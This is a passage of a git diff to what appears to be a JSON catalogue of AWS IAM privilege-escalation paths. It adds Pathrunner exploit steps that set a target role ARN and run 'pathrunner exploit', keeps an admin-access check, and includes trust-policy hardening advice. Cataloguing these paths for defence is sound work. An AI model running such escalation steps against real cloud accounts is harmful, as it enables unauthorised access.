+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -22541,8 +25146,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -23007,6 +25617,23 @@
           "command": "aws iam list-users --max-items 3",
           "description": "Verify administrative access was successfully obtained"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use sts-001",
+          "description": "Load the sts-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "recommendation": "- Avoiding using the account root notation (`arn:aws:iam::012345678901:root`) for internal accounts. This is fine to use with external accounts along with the externalID field, but is almost always overly permissive when used for internal AWS accounts.\n- Only allow trusted principals to assume sensitive roles. Use conditions when possible.\n\nExample restrictive trust policy:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificTrustedRole\"\n      },\n      \"Action\": \"sts:AssumeRole\",\n      \"Condition\": {\n        \"IpAddress\": {\n          \"aws:SourceIp\": \"1.2.3.0/24\"\n        }\n      }\n    }\n  ]\n}\n```\n\nAdditional controls:\n- **Require MFA**: Require MFA for sensitive role assumptions using `aws:MultiFactorAuthPresent` condition\n- **Use External IDs**: Use external IDs for third-party cross-account role assumptions to prevent confused deputy attacks\n- **IP Address Restrictions**: Implement IP address restrictions in trust policies using `aws:SourceIp` condition when possible.\n- **Session Policies**: Implement session policies to limit permissions even when assuming privileged roles, providing an additional layer of defense\n- **Monitor CloudTrail**: Alert on `AssumeRole` events on privileged roles, especially from unexpected principals\n- **Alert on Patterns**: Alert on unusual assume-role patterns or assumptions from unexpected IP addresses\n",
@@ -23165,8 +25792,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
